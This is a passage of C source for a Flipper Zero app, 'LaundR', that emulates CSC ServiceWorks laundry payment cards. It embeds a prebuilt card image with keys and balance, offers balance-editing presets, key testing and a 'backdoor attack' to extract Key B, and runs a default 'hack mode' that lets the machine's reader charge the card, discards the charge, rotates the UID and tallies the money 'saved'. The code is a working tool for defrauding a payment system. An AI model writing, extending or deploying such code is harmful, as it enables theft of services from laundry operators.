    app->original_blocks[3][7] = 0x77;
    app->original_blocks[3][8] = 0x88;
    app->original_blocks[3][9] = 0x00;
    memcpy(&app->original_blocks[3][10], key_b_ff, 6);
    app->original_block_valid[3] = true;

    // Sector 1, Block 4: Balance ($50.00 = 5000 cents) + Counter (16100 uses)
    // Counter 16100 = 0x3EE4, inverted = 0xC11B
    uint8_t block4[] = {0x88, 0x13, 0xE4, 0x3E, 0x77, 0xEC, 0x1B, 0xC1,
                        0x88, 0x13, 0xE4, 0x3E, 0x04, 0xFB, 0x04, 0xFB};
    memcpy(app->original_blocks[4], block4, 16);
    app->original_block_valid[4] = true;

    // Sector 1, Block 5-6: Zeros
    memset(app->original_blocks[5], 0, 16);
    app->original_block_valid[5] = true;
    memset(app->original_blocks[6], 0, 16);
    app->original_block_valid[6] = true;

    // Sector 1, Block 7: Trailer
    memcpy(app->original_blocks[7], csc_key_a, 6);
    app->original_blocks[7][6] = 0x68;
    app->original_blocks[7][7] = 0x77;
    app->original_blocks[7][8] = 0x89;
    app->original_blocks[7][9] = 0x00;
    memcpy(&app->original_blocks[7][10], key_b_ff, 6);
    app->original_block_valid[7] = true;

    // Sector 2, Block 8: Balance mirror
    memcpy(app->original_blocks[8], block4, 16);
    app->original_block_valid[8] = true;

    // Sector 2, Block 9
    uint8_t block9[] = {0x50, 0x16, 0xF0, 0x2B, 0xAF, 0xE9, 0x0F, 0xD4,
                        0x50, 0x16, 0xF0, 0x2B, 0x09, 0xF6, 0x09, 0xF6};
    memcpy(app->original_blocks[9], block9, 16);
    app->original_block_valid[9] = true;

    // Sector 2, Block 10
    uint8_t block10[] = {0x30, 0x30, 0x00, 0x01, 0x00, 0x00, 0x01, 0x84,
                         0x28, 0x30, 0x4E, 0x45, 0x54, 0x11, 0x00, 0x00};
    memcpy(app->original_blocks[10], block10, 16);
    app->original_block_valid[10] = true;

    // Sector 2, Block 11: Trailer
    memcpy(app->original_blocks[11], csc_key_a, 6);
    app->original_blocks[11][6] = 0x48;
    app->original_blocks[11][7] = 0x77;
    app->original_blocks[11][8] = 0x8B;
    app->original_blocks[11][9] = 0x00;
    memcpy(&app->original_blocks[11][10], key_b_ff, 6);
    app->original_block_valid[11] = true;

    // Sector 3, Block 12-14
    uint8_t block12[] = {0x00, 0x00, 0x01, 0x02, 0xFF, 0xFF, 0xFE, 0xFD,
                         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    memcpy(app->original_blocks[12], block12, 16);
    app->original_block_valid[12] = true;

    // Block 13: Site code - SANITIZED with random alphanumeric
    // Original was "AZ7602046" - we randomize to avoid location tracking
    uint8_t block13[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                         0x00, 0x02, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
    const char* alphanum = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for(int i = 0; i < 9; i++) {
        block13[i] = alphanum[(tick_value + i * 7) % 36];
    }
    memcpy(app->original_blocks[13], block13, 16);
    app->original_block_valid[13] = true;
    laundr_log_write("Sanitized site code: %c%c%c%c%c%c%c%c%c",
        block13[0], block13[1], block13[2], block13[3], block13[4],
        block13[5], block13[6], block13[7], block13[8]);

    memset(app->original_blocks[14], 0, 16);
    app->original_block_valid[14] = true;

    // Sector 3, Block 15: Trailer
    memcpy(app->original_blocks[15], csc_key_a, 6);
    app->original_blocks[15][6] = 0x7F;
    app->original_blocks[15][7] = 0x07;
    app->original_blocks[15][8] = 0x88;
    app->original_blocks[15][9] = 0x00;
    memcpy(&app->original_blocks[15][10], key_b_ff, 6);
    app->original_block_valid[15] = true;

    // Fill remaining sectors with CSC key trailers
    for(int sector = 4; sector < 16; sector++) {
        int trailer_block = sector * 4 + 3;
        memcpy(app->original_blocks[trailer_block], csc_key_a, 6);
        app->original_blocks[trailer_block][6] = 0x7F;
        app->original_blocks[trailer_block][7] = 0x07;
        app->original_blocks[trailer_block][8] = 0x88;
        app->original_blocks[trailer_block][9] = 0x00;
        memcpy(&app->original_blocks[trailer_block][10], key_b_ff, 6);
        app->original_block_valid[trailer_block] = true;
    }

    // Copy to modified blocks
    memcpy(app->modified_blocks, app->original_blocks, sizeof(app->original_blocks));
    memcpy(app->modified_block_valid, app->original_block_valid, sizeof(app->original_block_valid));

    // Set file path to indicate embedded card
    if(app->file_path) {
        furi_string_set(app->file_path, "[Embedded] CSC SW MasterCard");
    }

    app->card_loaded = true;
    app->has_modifications = false;

    // Set UID to "RANDOMIZED" - will be shown on display
    // Actual random UID is in block 0, but we show RANDOMIZED to user
    snprintf(app->uid, sizeof(app->uid), "RANDOMIZED");

    // Override provider name for MasterCard
    snprintf(app->provider, sizeof(app->provider), "CSC SW MasterKey");

    laundr_parse_balance(app);
    laundr_rebuild_submenu(app);

    laundr_log_write("CSC SW MasterCard loaded: $%.2f (UID: RANDOMIZED)", (double)app->balance / 100);

    // Show card info
    laundr_show_card_info(app);
}

static void laundr_submenu_callback(void* context, uint32_t index) {
    laundr_log_write(">>> laundr_submenu_callback() called with index=%lu, context=%p", index, context);

    if(!context) {
        laundr_log_write("ERROR: NULL context in submenu callback!");
        return;
    }

    LaundRApp* app = context;
    laundr_log_write("App pointer: %p", (void*)app);

    // Cancel deferred stop timer if running
    if(app->stop_timer) {
        laundr_log_write("Stopping deferred timer");
        furi_timer_stop(app->stop_timer);
    }

    // DON'T stop emulation here - that's handled by:
    // 1. Widget exit callback (when user presses back)
    // 2. Explicit "Stop Emulation" menu item
    // 3. App exit callback

    switch(index) {
    case LaundRSubmenuIndexLoadCard: {
        FuriString* path = furi_string_alloc_set(NFC_APP_FOLDER);

        DialogsFileBrowserOptions browser_options;
        dialog_file_browser_set_basic_options(&browser_options, LAUNDR_APP_EXTENSION, NULL);
        browser_options.base_path = NFC_APP_FOLDER;

        if(dialog_file_browser_show(app->dialogs, path, path, &browser_options)) {
            if(laundr_load_nfc_file(app, furi_string_get_cstr(path))) {
                furi_string_set(app->file_path, path);

                // Generate shadow file path
                furi_string_set(app->shadow_path, path);
                size_t ext_pos = furi_string_search_rchar(app->shadow_path, '.');
                if(ext_pos != FURI_STRING_FAILURE) {
                    furi_string_left(app->shadow_path, ext_pos);
                }
                furi_string_cat_str(app->shadow_path, SHADOW_FILE_EXTENSION);

                // Copy original to modified
                memcpy(app->modified_blocks, app->original_blocks, sizeof(app->original_blocks));
                memcpy(app->modified_block_valid, app->original_block_valid, sizeof(app->original_block_valid));

                // Load shadow file if exists
                laundr_load_shadow_file(app, furi_string_get_cstr(app->shadow_path));

                app->card_loaded = true;
                app->has_modifications = false;

                laundr_detect_provider(app);
                laundr_parse_balance(app);
                laundr_rebuild_submenu(app);

                // Save as last opened card
                laundr_save_last_card(app, furi_string_get_cstr(app->file_path));

                // Show card info (uses persistent widget strings, no stack-allocated buffers)
                laundr_show_card_info(app);
            }
        }

        furi_string_free(path);
        break;
    }

    case LaundRSubmenuIndexReadCard: {
        // Read physical CSC card via NFC
        laundr_read_card(app);
        break;
    }

    case LaundRSubmenuIndexWriteToCard: {
        // Write balance from modified_blocks to physical card
        laundr_write_to_card(app);
        break;
    }

    case LaundRSubmenuIndexTestCardKeys: {
        // Test all known keys against card for read/write capability
        laundr_test_card_keys(app);
        break;
    }

    case LaundRSubmenuIndexCrackKeyB: {
        // Try backdoor attack to extract Key B from sector trailer
        laundr_crack_key_b(app);
        break;
    }

    case LaundRSubmenuIndexCSCMasterCard: {
        laundr_load_csc_mastercard(app);
        break;
    }

    case LaundRSubmenuIndexViewCardInfo: {
        laundr_show_card_info(app);
        break;
    }

    case LaundRSubmenuIndexStartEmulation: {
        laundr_log_write("Menu: Start Emulation selected");
        laundr_start_emulation(app);
        break;
    }

    case LaundRSubmenuIndexStopEmulation: {
        laundr_log_write("Menu: Stop Emulation selected");
        laundr_stop_emulation(app);
        laundr_rebuild_submenu(app);
        break;
    }

    case LaundRSubmenuIndexApplyChanges: {
        if(laundr_save_shadow_file(app, furi_string_get_cstr(app->shadow_path))) {
            app->has_modifications = false;
            laundr_rebuild_submenu(app);

            widget_reset(app->widget);
            widget_add_string_element(
                app->widget, 64, 20, AlignCenter, AlignTop, FontPrimary, "Changes Applied!");
            widget_add_string_element(
                app->widget, 64, 35, AlignCenter, AlignTop, FontSecondary, "Shadow file saved");

            View* widget_view = widget_get_view(app->widget);
            view_set_input_callback(widget_view, laundr_widget_input_callback);
            view_set_context(widget_view, app);

            view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewWidget);
        }
        break;
    }

    case LaundRSubmenuIndexRevertChanges: {
        memcpy(app->modified_blocks, app->original_blocks, sizeof(app->original_blocks));
        memcpy(app->modified_block_valid, app->original_block_valid, sizeof(app->original_block_valid));

        app->has_modifications = false;
        laundr_parse_balance(app);
        laundr_rebuild_submenu(app);
        laundr_show_card_info(app);
        break;
    }

    case LaundRSubmenuIndexEditBalance: {
        double balance_dollars = (double)app->balance / 100;
        snprintf(app->text_input_buffer, sizeof(app->text_input_buffer), "%.2f", balance_dollars);

        text_input_set_header_text(app->text_input, "Enter Balance ($)");
        text_input_set_result_callback(
            app->text_input,
            laundr_text_input_callback,
            app,
            app->text_input_buffer,
            sizeof(app->text_input_buffer),
            true);

        view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewTextInput);
        break;
    }

    case LaundRSubmenuIndexSetBalance10: {
        laundr_set_balance_preset(app, 1000);  // $10.00
        break;
    }

    case LaundRSubmenuIndexSetBalance25: {
        laundr_set_balance_preset(app, 2500);  // $25.00
        break;
    }

    case LaundRSubmenuIndexSetBalance50: {
        laundr_set_balance_preset(app, 5000);  // $50.00
        break;
    }

    case LaundRSubmenuIndexSetBalance100: {
        laundr_set_balance_preset(app, 10000);  // $100.00
        break;
    }

    case LaundRSubmenuIndexSetBalanceMax: {
        laundr_set_balance_preset(app, 65535);  // $655.35 (max uint16)
        break;
    }

    case LaundRSubmenuIndexViewBlocks: {
        furi_string_reset(app->text_box_store);

        for(int i = 0; i < 64; i++) {
            if(app->modified_block_valid[i]) {
                char line[128];

                bool modified = false;
                if(app->original_block_valid[i]) {
                    for(int j = 0; j < 16; j++) {
                        if(app->modified_blocks[i][j] != app->original_blocks[i][j]) {
                            modified = true;
                            break;
                        }
                    }
                } else {
                    modified = true;
                }

                snprintf(line, sizeof(line), "Block %02d%s: ", i, modified ? "*" : " ");
                furi_string_cat_str(app->text_box_store, line);

                for(int j = 0; j < 16; j++) {
                    snprintf(line, sizeof(line), "%02X ", app->modified_blocks[i][j]);
                    furi_string_cat_str(app->text_box_store, line);
                }

                furi_string_cat_str(app->text_box_store, "\n");
            }
        }

        text_box_set_text(app->text_box, furi_string_get_cstr(app->text_box_store));
        text_box_set_font(app->text_box, TextBoxFontHex);
        text_box_set_focus(app->text_box, TextBoxFocusStart);  // Enable scrolling
        view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewTextBox);
        break;
    }

    case LaundRSubmenuIndexEditBlock: {
        app->current_block_edit = 4;
        memcpy(app->byte_input_buffer, app->modified_blocks[4], 16);

        byte_input_set_header_text(app->byte_input, "Edit Block 4");
        byte_input_set_result_callback(
            app->byte_input,
            laundr_byte_input_callback,
            NULL,
            app,
            app->byte_input_buffer,
            16);

        view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewByteInput);
        break;
    }

    case LaundRSubmenuIndexHackMode: {
        // HACK → LEGIT
        app->mode = LaundRModeLegit;
        laundr_log_write("MODE CHANGED: HACK → LEGIT");
        laundr_rebuild_submenu(app);
        if(app->card_loaded) {
            laundr_show_card_info(app);
        }
        break;
    }

    case LaundRSubmenuIndexLegitMode: {
        // LEGIT → HACK (just toggle between the two)
        app->mode = LaundRModeHack;
        laundr_log_write("MODE CHANGED: LEGIT → HACK");
        laundr_rebuild_submenu(app);
        if(app->card_loaded) {
            laundr_show_card_info(app);
        }
        break;
    }

    case LaundRSubmenuIndexMasterKeyAudit: {
        // Run Master-Key Audit - auto-discover working auth config
        laundr_log_write("═══════════════════════════════════════════════");
        laundr_log_write("🔑 MASTER-KEY AUDIT INITIATED");
        laundr_log_write("═══════════════════════════════════════════════");

        // If no card is loaded, create a generic probe card
        if(!app->card_loaded) {
            laundr_log_write("No card loaded - creating generic MIFARE Classic probe");
            laundr_create_generic_card(app);
        } else {
            laundr_log_write("Using loaded card: %s", furi_string_get_cstr(app->file_path));
        }

        // Switch to Interrogate mode
        app->mode = LaundRModeInterrogate;

        // Show Master-Key custom screen
        laundr_show_master_key_audit(app);

        // Auto-start emulation if not already running
        if(!app->emulating) {
            laundr_start_emulation(app);
            laundr_update_master_key_progress(app);  // Refresh to show scanning state
        }
        break;
    }

    case LaundRSubmenuIndexViewLog: {
        // Read log file and display in text box
        Storage* storage = furi_record_open(RECORD_STORAGE);
        File* file = storage_file_alloc(storage);

        furi_string_reset(app->text_box_store);

        if(storage_file_open(file, LAUNDR_LOG_FILE, FSAM_READ, FSOM_OPEN_EXISTING)) {
            uint64_t file_size = storage_file_size(file);

            if(file_size == 0) {
                furi_string_set(app->text_box_store, "Log is empty\n\nNo reader interactions yet");
            } else {
                char* buffer = malloc(file_size + 1);
                if(buffer) {
                    uint16_t bytes_read = storage_file_read(file, buffer, file_size);
                    buffer[bytes_read] = '\0';
                    furi_string_set(app->text_box_store, buffer);
                    free(buffer);
                }
            }
            storage_file_close(file);
        } else {
            furi_string_set(app->text_box_store, "No log file found\n\nStart emulation to\ngenerate logs");
        }

        storage_file_free(file);
        furi_record_close(RECORD_STORAGE);

        text_box_set_text(app->text_box, furi_string_get_cstr(app->text_box_store));
        text_box_set_font(app->text_box, TextBoxFontText);
        text_box_set_focus(app->text_box, TextBoxFocusStart);  // Enable scrolling
        view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewTextBox);
        break;
    }

    case LaundRSubmenuIndexViewTransactionStats: {
        // Show transaction stats: session totals and CSV summary
        widget_reset(app->widget);

        // Session stats
        widget_add_string_element(
            app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary, "Transaction Stats");

        snprintf(app->widget_str1, sizeof(app->widget_str1),
            "Session: %lu txns", app->transaction_count);
        widget_add_string_element(
            app->widget, 2, 14, AlignLeft, AlignTop, FontSecondary, app->widget_str1);

        snprintf(app->widget_str2, sizeof(app->widget_str2),
            "Reads: %lu  Writes: %lu", app->reads, app->writes);
        widget_add_string_element(
            app->widget, 2, 24, AlignLeft, AlignTop, FontSecondary, app->widget_str2);

        snprintf(app->widget_str3, sizeof(app->widget_str3),
            "Blocked: %lu", app->writes_blocked);
        widget_add_string_element(
            app->widget, 2, 34, AlignLeft, AlignTop, FontSecondary, app->widget_str3);

        // Read CSV to count total historical transactions
        Storage* storage = furi_record_open(RECORD_STORAGE);
        File* file = storage_file_alloc(storage);
        uint32_t csv_tx_count = 0;
        int32_t total_charged = 0;

        if(storage_file_open(file, LAUNDR_TRANSACTION_CSV_FILE, FSAM_READ, FSOM_OPEN_EXISTING)) {
            char line[256];
            bool first_line = true;
            size_t pos = 0;

            while(!storage_file_eof(file)) {
                char c;
                if(storage_file_read(file, &c, 1) != 1) break;

                if(c == '\n' || pos >= sizeof(line) - 1) {
                    line[pos] = '\0';
                    if(!first_line && pos > 0) {
                        csv_tx_count++;
                        // Parse charge from CSV: timestamp,tx_num,uid,provider,bal_before,bal_after,charge,...
                        char* field = line;
                        int field_num = 0;
                        while(field && field_num < 7) {
                            char* next = strchr(field, ',');
                            if(next) *next = '\0';
                            if(field_num == 6) {  // charge_cents field
                                total_charged += atoi(field);
                            }
                            if(next) field = next + 1;
                            else break;
                            field_num++;
                        }
                    }
                    first_line = false;
                    pos = 0;
                } else {
                    line[pos++] = c;
                }
            }
            storage_file_close(file);
        }
        storage_file_free(file);
        furi_record_close(RECORD_STORAGE);

        snprintf(app->widget_str4, sizeof(app->widget_str4),
            "History: %lu txns", csv_tx_count);
        widget_add_string_element(
            app->widget, 2, 44, AlignLeft, AlignTop, FontSecondary, app->widget_str4);

        // Total saved (charges blocked in hack mode)
        snprintf(app->widget_str5, sizeof(app->widget_str5),
            "Saved: $%.2f", (double)(-total_charged) / 100);
        widget_add_string_element(
            app->widget, 2, 54, AlignLeft, AlignTop, FontSecondary, app->widget_str5);

        View* widget_view = widget_get_view(app->widget);
        view_set_input_callback(widget_view, laundr_widget_input_callback);
        view_set_context(widget_view, app);

        view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewWidget);
        break;
    }

    case LaundRSubmenuIndexClearLog: {
        laundr_log_clear();

        widget_reset(app->widget);
        widget_add_string_element(
            app->widget, 64, 20, AlignCenter, AlignTop, FontPrimary, "Log Cleared");
        widget_add_string_element(
            app->widget, 64, 35, AlignCenter, AlignTop, FontSecondary, "All logs deleted");

        View* widget_view = widget_get_view(app->widget);
        view_set_input_callback(widget_view, laundr_widget_input_callback);
        view_set_context(widget_view, app);

        view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewWidget);
        break;
    }

    case LaundRSubmenuIndexAbout: {
        char about_text[512];
        snprintf(about_text, sizeof(about_text),
            "LaundR v%s\n"
            "Built: %s %s\n"
            "\n"
            "Real NFC emulation\n"
            "via Flipper antenna\n"
            "\n"
            "HACK MODE:\n"
            "Balance writes blocked\n"
            "Reader thinks it worked\n"
            "Balance stays same\n"
            "\n"
            "LEGIT MODE:\n"
            "Normal card operation\n"
            "Balance gets deducted\n"
            "\n"
            "Shadow file system:\n"
            "Original .nfc never\n"
            "modified. Changes in\n"
            ".laundr files.\n"
            "\n"
            "Hold Flipper to reader\n"
            "while emulating\n"
            "\n"
            "Log: SD:/apps/NFC/\n"
            "laundr.log",
            LAUNDR_VERSION, LAUNDR_BUILD_DATE, LAUNDR_BUILD_TIME);

        furi_string_set(app->text_box_store, about_text);
        text_box_set_text(app->text_box, furi_string_get_cstr(app->text_box_store));
        text_box_set_font(app->text_box, TextBoxFontText);
        text_box_set_focus(app->text_box, TextBoxFocusStart);  // Enable scrolling
        view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewTextBox);
        break;
    }
    }
}

static uint32_t laundr_exit_callback(void* context) {
    UNUSED(context);
    laundr_log_write(">>> laundr_exit_callback() - app exit requested");
    return VIEW_NONE;
}

// Simple back callback for TextBox - just returns to menu
static uint32_t laundr_textbox_back_callback(void* context) {
    UNUSED(context);
    return LaundRViewSubmenu;
}

// Widget input callback - handle all input to prevent crashes
static bool laundr_widget_input_callback(InputEvent* event, void* context) {
    UNUSED(context);
    // Let ALL back button events through (both press and release)
    if(event->key == InputKeyBack) {
        return false;  // Let the system handle it (will call previous_callback)
    }
    // Swallow all other inputs to prevent crashes
    return true;
}

// Card info input callback - OK button toggles emulation
// Forward declaration for transaction stats from card info
static void laundr_show_transaction_stats_from_card_info(LaundRApp* app);

static bool laundr_card_info_input_callback(InputEvent* event, void* context) {
    LaundRApp* app = context;

    // Let back button through
    if(event->key == InputKeyBack) {
        return false;  // Let system handle navigation
    }

    // OK button toggles emulation (on short press only)
    if(event->key == InputKeyOk && event->type == InputTypeShort) {
        if(app->emulating) {
            // Stop emulation
            laundr_stop_emulation(app);
            laundr_rebuild_submenu(app);
            laundr_show_card_info(app);  // Refresh display
        } else {
            // Start emulation
            laundr_start_emulation(app);
        }
        return true;  // Consumed
    }

    // Left button shows transaction stats
    if(event->key == InputKeyLeft && event->type == InputTypeShort) {
        laundr_show_transaction_stats_from_card_info(app);
        return true;  // Consumed
    }

    // Swallow all other inputs
    return true;
}

// Input callback for transaction stats screen (from card info) - back returns to card info
static bool laundr_stats_from_card_input_callback(InputEvent* event, void* context) {
    LaundRApp* app = context;

    // Back or OK returns to card info
    if((event->key == InputKeyBack || event->key == InputKeyOk) && event->type == InputTypeShort) {
        laundr_show_card_info(app);
        return true;
    }

    // Swallow all other inputs
    return true;
}

// Show transaction stats from card info screen (left button)
static void laundr_show_transaction_stats_from_card_info(LaundRApp* app) {
    widget_reset(app->widget);

    // Session stats
    widget_add_string_element(
        app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary, "Transaction Stats");

    snprintf(app->widget_str1, sizeof(app->widget_str1),
        "Session: %lu txns", app->transaction_count);
    widget_add_string_element(
        app->widget, 2, 14, AlignLeft, AlignTop, FontSecondary, app->widget_str1);

    snprintf(app->widget_str2, sizeof(app->widget_str2),
        "Reads: %lu  Writes: %lu", app->reads, app->writes);
    widget_add_string_element(
        app->widget, 2, 24, AlignLeft, AlignTop, FontSecondary, app->widget_str2);

    snprintf(app->widget_str3, sizeof(app->widget_str3),
        "Blocked: %lu", app->writes_blocked);
    widget_add_string_element(
        app->widget, 2, 34, AlignLeft, AlignTop, FontSecondary, app->widget_str3);

    // Read CSV to count total historical transactions
    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* file = storage_file_alloc(storage);
    uint32_t csv_tx_count = 0;
    int32_t total_charged = 0;

    if(storage_file_open(file, LAUNDR_TRANSACTION_CSV_FILE, FSAM_READ, FSOM_OPEN_EXISTING)) {
        char line[256];
        bool first_line = true;
        size_t pos = 0;

        while(!storage_file_eof(file)) {
            char c;
            if(storage_file_read(file, &c, 1) != 1) break;

            if(c == '\n' || pos >= sizeof(line) - 1) {
                line[pos] = '\0';
                if(!first_line && pos > 0) {
                    csv_tx_count++;
                    // Parse charge from CSV
                    char* field = line;
                    int field_num = 0;
                    while(field && field_num < 7) {
                        char* next = strchr(field, ',');
                        if(next) *next = '\0';
                        if(field_num == 6) {
                            total_charged += atoi(field);
                        }
                        if(next) field = next + 1;
                        else break;
                        field_num++;
                    }
                }
                first_line = false;
                pos = 0;
            } else {
                line[pos++] = c;
            }
        }
        storage_file_close(file);
    }
    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);

    snprintf(app->widget_str4, sizeof(app->widget_str4),
        "History: %lu txns", csv_tx_count);
    widget_add_string_element(
        app->widget, 2, 44, AlignLeft, AlignTop, FontSecondary, app->widget_str4);

    snprintf(app->widget_str5, sizeof(app->widget_str5),
        "Saved: $%.2f", (double)(-total_charged) / 100);
    widget_add_string_element(
        app->widget, 2, 54, AlignLeft, AlignTop, FontSecondary, app->widget_str5);

    // Hint to return
    widget_add_string_element(
        app->widget, 128, 54, AlignRight, AlignTop, FontSecondary, "OK:Back");

    View* widget_view = widget_get_view(app->widget);
    view_set_input_callback(widget_view, laundr_stats_from_card_input_callback);
    view_set_context(widget_view, app);

    view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewWidget);
}

// Splash screen dismissal state
typedef enum {
    SplashActionNone,
    SplashActionDismiss,
} SplashAction;

static volatile SplashAction splash_action = SplashActionNone;

// Input event callback for splash screen (via FuriPubSub)
static void splash_input_callback(const void* event, void* context) {
    UNUSED(context);
    const InputEvent* input_event = event;

    // Any key press dismisses splash (use Press not Release to prevent bleed-through)
    if(input_event->type == InputTypePress) {
        splash_action = SplashActionDismiss;
    }
}

// Timer callback to stop emulation after view transition completes
static void laundr_deferred_stop_callback(void* context) {
    LaundRApp* app = context;
    laundr_log_write(">>> laundr_deferred_stop_callback() called");
    FURI_LOG_I(TAG, "Deferred stop: stopping NFC listener");
    laundr_stop_emulation(app);
}

// Back button callback - stops emulation if active and returns to menu
static uint32_t laundr_back_to_submenu_callback(void* context) {
    laundr_log_write(">>> laundr_back_to_submenu_callback() called");

    // Check if we even have a valid app pointer
    if(!context) {
        laundr_log_write("WARNING: NULL context in back callback");
        return LaundRViewSubmenu;
    }

    LaundRApp* app = context;
    laundr_log_write("App=%p, Listener=%p", (void*)app, (void*)app->nfc_listener);

    // If emulation is active, stop it NOW
    if(app->nfc_listener != NULL) {
        laundr_log_write("Stopping active emulation...");

        // Stop transaction monitor timer first
        if(app->transaction_monitor_timer && furi_timer_is_running(app->transaction_monitor_timer)) {
            furi_timer_stop(app->transaction_monitor_timer);
            laundr_log_write("Transaction monitor timer stopped");
        }

        // Stop listener (but don't free yet - we need to retrieve data first)
        nfc_listener_stop(app->nfc_listener);

        if(app->notifications) {
            notification_message(app->notifications, &sequence_blink_stop);
        }

        // === TRANSACTION TRACKING (before freeing listener) ===

        // CRITICAL: Get data from LISTENER (it has reader's modifications)
        // Listener is stopped but still valid - we can read data from it
        const MfClassicData* listener_data = (const MfClassicData*)nfc_listener_get_data(
            app->nfc_listener, NfcProtocolMfClassic);
        if(listener_data) {
            laundr_log_write("Copying LISTENER data back (has reader's modifications)...");
            for(int block = 0; block < 64; block++) {
                if(app->emulation_block_valid[block]) {
                    memcpy(app->emulation_blocks[block], listener_data->block[block].data, 16);
                }
            }

            // DEBUG: Log balance block to see if reader wrote anything
            laundr_log_write("DEBUG: Block 4 after emulation: %02X %02X %02X %02X %02X %02X %02X %02X",
                app->emulation_blocks[4][0], app->emulation_blocks[4][1],
                app->emulation_blocks[4][2], app->emulation_blocks[4][3],
                app->emulation_blocks[4][4], app->emulation_blocks[4][5],
                app->emulation_blocks[4][6], app->emulation_blocks[4][7]);
        } else {
            laundr_log_write("WARNING: Could not get listener data!");
        }

        // HACK MODE: Check for balance changes and block charges
        if(app->mode == LaundRModeHack) {
            // Parse balance from emulation blocks (what the reader wrote)
            uint16_t emulated_balance = 0;
            bool emulated_valid = false;

            if(app->emulation_block_valid[4]) {
                uint8_t* block = app->emulation_blocks[4];
                uint16_t bal = (uint16_t)block[0] | ((uint16_t)block[1] << 8);
                uint16_t bal_inv = (uint16_t)block[4] | ((uint16_t)block[5] << 8);

                laundr_log_write("DEBUG: Emulated balance bytes: %04X, inverted: %04X, XOR: %04X",
                    bal, bal_inv, bal ^ bal_inv);

                if((bal ^ bal_inv) == 0xFFFF) {
                    emulated_balance = bal;
                    emulated_valid = true;
                    laundr_log_write("DEBUG: Emulated balance VALID: %u cents ($%.2f)", bal, (double)bal/100);
                } else {
                    laundr_log_write("DEBUG: Emulated balance INVALID (checksum mismatch)");
                }
            }

            // Parse original balance from modified blocks
            uint16_t original_balance = 0;
            bool original_valid = false;

            if(app->modified_block_valid[4]) {
                uint8_t* block = app->modified_blocks[4];
                uint16_t bal = (uint16_t)block[0] | ((uint16_t)block[1] << 8);
                uint16_t bal_inv = (uint16_t)block[4] | ((uint16_t)block[5] << 8);

                laundr_log_write("DEBUG: Original balance bytes: %04X, inverted: %04X, XOR: %04X",
                    bal, bal_inv, bal ^ bal_inv);

                if((bal ^ bal_inv) == 0xFFFF) {
                    original_balance = bal;
                    original_valid = true;
                    laundr_log_write("DEBUG: Original balance VALID: %u cents ($%.2f)", bal, (double)bal/100);
                } else {
                    laundr_log_write("DEBUG: Original balance INVALID (checksum mismatch)");
                }
            }

            // Check if balance changed
            if(emulated_valid && original_valid && emulated_balance != original_balance) {
                int32_t change = (int32_t)emulated_balance - (int32_t)original_balance;
                app->last_charge_amount = (int16_t)change;
                app->transaction_count++;

                if(change < 0) {
                    // Balance decreased - BLOCK IT!
                    laundr_log_write("");
                    laundr_log_write("╔═══════════════════════════════════════════════╗");
                    laundr_log_write("║        HACK MODE: CHARGE NOT PERSISTED        ║");
                    laundr_log_write("╚═══════════════════════════════════════════════╝");
                    laundr_log_write("Reader charged: -$%.2f", (double)(-change) / 100);
                    laundr_log_write("Reader saw: $%.2f → $%.2f", (double)original_balance / 100, (double)emulated_balance / 100);
                    laundr_log_write("File balance: $%.2f (UNCHANGED)", (double)original_balance / 100);
                    laundr_log_write("Transaction #%lu", app->transaction_count);
                    laundr_log_write("lol, nah. 😎");
                    laundr_log_write("");

                    app->writes_blocked++;

                    // Rotate UID after blocked charge
                    laundr_rotate_uid(app);

                    // Set flag to auto-restart emulation after freeing listener
                    app->auto_restart_emulation = true;

                } else {
                    // Balance increased (credit) - allow it
                    laundr_log_write("Balance increased by $%.2f - allowing change", (double)change / 100);
                    memcpy(app->modified_blocks[4], app->emulation_blocks[4], 16);
                    if(app->emulation_block_valid[8]) {
                        memcpy(app->modified_blocks[8], app->emulation_blocks[8], 16);
                    }
                    laundr_rotate_uid(app);

                    // Set flag to auto-restart emulation after freeing listener
                    app->auto_restart_emulation = true;
                }
            }
        } else if(app->mode == LaundRModeLegit) {
            // LEGIT MODE: Copy all changes
            laundr_log_write("LEGIT MODE: Syncing emulation changes to card data");
            for(int i = 0; i < 64; i++) {
                if(app->emulation_block_valid[i]) {
                    memcpy(app->modified_blocks[i], app->emulation_blocks[i], 16);
                }
            }
            laundr_parse_balance(app);
            app->transaction_count++;
        }

        // Log stats
        laundr_log_write("=== EMULATION STOPPED ===");
        laundr_log_write("Reads: %lu, Writes: %lu, Blocked: %lu", app->reads, app->writes, app->writes_blocked);
        laundr_log_write("Transactions: %lu", app->transaction_count);

        // === END TRANSACTION TRACKING ===

        // Now free the listener
        void* listener = app->nfc_listener;
        app->nfc_listener = NULL;
        app->emulating = false;
        nfc_listener_free(listener);

        laundr_log_write("Emulation stopped");

        // Check if we should auto-restart emulation (after transaction)
        if(app->auto_restart_emulation) {
            laundr_log_write("Auto-restarting emulation with fresh balance...");
            app->auto_restart_emulation = false;

            // Immediately restart emulation (seamless for user)
            laundr_start_emulation(app);

            // Stay on widget view (don't return to submenu)
            return LaundRViewWidget;
        }
    }

    laundr_log_write("Returning to submenu");
    return LaundRViewSubmenu;
}

static uint32_t laundr_popup_back_callback(void* context) {
    UNUSED(context);
    return LaundRViewSubmenu;
}

// ============================================================================
// ALLOC/FREE
// ============================================================================

static LaundRApp* laundr_app_alloc(void) {
    LaundRApp* app = malloc(sizeof(LaundRApp));
    memset(app, 0, sizeof(LaundRApp));

    app->file_path = furi_string_alloc();
    app->shadow_path = furi_string_alloc();
    app->text_box_store = furi_string_alloc();
    app->mode = LaundRModeHack;  // Default to Hack mode

    app->dialogs = furi_record_open(RECORD_DIALOGS);
    app->notifications = furi_record_open(RECORD_NOTIFICATION);
    app->storage = furi_record_open(RECORD_STORAGE);

